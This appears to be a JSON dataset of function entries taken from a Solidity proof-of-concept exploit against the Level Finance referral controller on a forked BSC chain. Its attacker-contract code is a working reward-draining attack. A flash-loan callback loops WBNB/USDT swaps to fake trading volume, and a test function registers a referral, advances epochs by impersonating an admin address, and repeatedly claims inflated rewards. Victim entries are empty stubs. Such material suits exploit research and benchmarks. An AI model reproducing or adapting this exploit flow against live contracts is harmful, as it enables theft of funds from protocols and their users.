[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        uint256 amount = abi.decode(data, (uint256));\n        for (uint256 i; i < amount; i++) {\n            WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));\n            pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(exploiter)));\n            USDT.transfer(address(pool), USDT.balanceOf(address(this)));\n            pool.swap(address(USDT), address(WBNB), 1, address(this), abi.encode(address(exploiter)));\n        }\n        WBNB.transfer(address(exploiter), WBNB.balanceOf(address(this)));\n        exploiter.swap(20);\n        WBNB.transfer(dodo, 300 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 27_830_139);\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(LVL), \"LVL\");\n        cheats.label(address(LevelReferralControllerV2), \"LevelReferralControllerV2\");\n        cheats.label(address(pool), \"pool\");\n        cheats.label(address(dodo), \"dodo\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        deal(address(WBNB), address(this), 95 * 1e18);\n        exploiter = new Exploiter(address(this));\n        LevelReferralControllerV2.setReferrer(address(exploiter));\n        createReferral();\n        WashTrading();\n        vm.warp(block.timestamp + 1 * 60 * 60);\n        vm.startPrank(0x6023C6afa26a68E05672F111FdbB1De93cBAc621);\n        LevelReferralControllerV2.setEnableNextEpoch(true);\n        LevelReferralControllerV2.nextEpoch();\n        vm.stopPrank();\n        vm.warp(block.timestamp + 60 * 60);\n        claim();\n        vm.warp(block.timestamp + 5 * 60 * 60);\n        for (uint256 i; i < 11; i++) {\n            claimReward(2000);\n            vm.warp(block.timestamp + i * 15);\n        }\n\n        emit log_named_decimal_uint(\n            \"Attacker LVL Token balance after exploit\", LVL.balanceOf(address(this)), LVL.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILevelReferralControllerV2",
    "source_type": "victim_contract",
    "function_name": "claim",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILevelReferralControllerV2",
    "source_type": "victim_contract",
    "function_name": "claimMultiple",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILevelReferralControllerV2",
    "source_type": "victim_contract",
    "function_name": "claimable",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILevelReferralControllerV2",
    "source_type": "victim_contract",
    "function_name": "currentEpoch",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILevelReferralControllerV2",
    "source_type": "victim_contract",
    "function_name": "nextEpoch",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILevelReferralControllerV2",
    "source_type": "victim_contract",
    "function_name": "setEnableNextEpoch",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILevelReferralControllerV2",
    "source_type": "victim_contract",
    "function_name": "setReferrer",
    "original_code": "",
    "description": ""
  }
]